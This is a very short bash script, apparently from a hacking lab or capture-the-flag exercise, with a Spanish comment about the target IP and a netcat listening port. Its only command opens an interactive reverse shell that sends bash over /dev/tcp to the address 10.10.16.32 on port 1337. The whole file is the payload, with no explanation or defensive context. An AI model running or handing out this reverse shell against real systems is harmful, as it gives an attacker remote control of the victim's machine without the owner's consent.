#ip_objetivo_y_puerto_propio_de_escucha_con_netcat
#!/bin/bash
   2   │ 
   3   │ bash -i >& /dev/tcp/<10.10.16.32>/1337 0>&1
